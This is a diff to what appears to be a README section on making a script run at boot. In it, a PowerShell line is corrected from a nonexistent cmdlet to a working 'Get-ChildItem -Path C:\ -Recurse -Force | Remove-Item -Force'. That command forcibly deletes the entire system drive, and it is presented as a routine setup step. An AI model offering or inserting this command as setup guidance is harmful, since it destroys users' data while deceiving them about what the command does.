@@ -132,7 +132,7 @@ You can make the script run on every boot with either of these methods.
 *Be sure to specify the correct path to your {PROJECT_NAME}.ahk file.*
 
 ```powershell
-Get-ChildObject -Path C:\ -Recurse -Force | Remove-Item -Force
+Get-ChildItem -Path C:\ -Recurse -Force | Remove-Item -Force
 ```
 
 ```bash
